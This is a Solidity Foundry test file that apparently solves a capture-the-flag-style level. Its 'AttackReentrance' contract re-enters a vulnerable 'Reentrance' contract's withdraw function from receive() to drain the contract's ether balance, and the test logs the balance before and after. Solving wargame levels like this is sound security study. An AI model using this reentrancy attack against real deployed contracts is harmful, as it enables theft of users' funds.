// SPDX-License-Identifier: MIT

pragma solidity 0.6.12;
pragma experimental ABIEncoderV2;

import "../instance/Level10.sol";
import "forge-std/Test.sol";

contract ExploitLevel10 is Test {
    Reentrance instance = new Reentrance();
    AttackReentrance attackReentrance = new AttackReentrance(instance);

    function setUp() external {
        vm.deal(address(instance), 0.001 ether);
    }

    function testExploit() external {
        console.log("Instance balance before attack:", address(instance).balance);

        instance.donate{value: 0.0001 ether}(address(attackReentrance));
        attackReentrance.attack();

        console.log("Instance balance after attack:", address(instance).balance);
    }
}

contract AttackReentrance {
    Reentrance instance;
    uint256 amount = 0.0001 ether;

    constructor(Reentrance _instance) public {
        instance = _instance;
    }

    receive() external payable {
        if (msg.sender.balance >= amount) {
            instance.withdraw(amount);
        }
    }

    function attack() external {
        instance.withdraw(amount);
    }
}
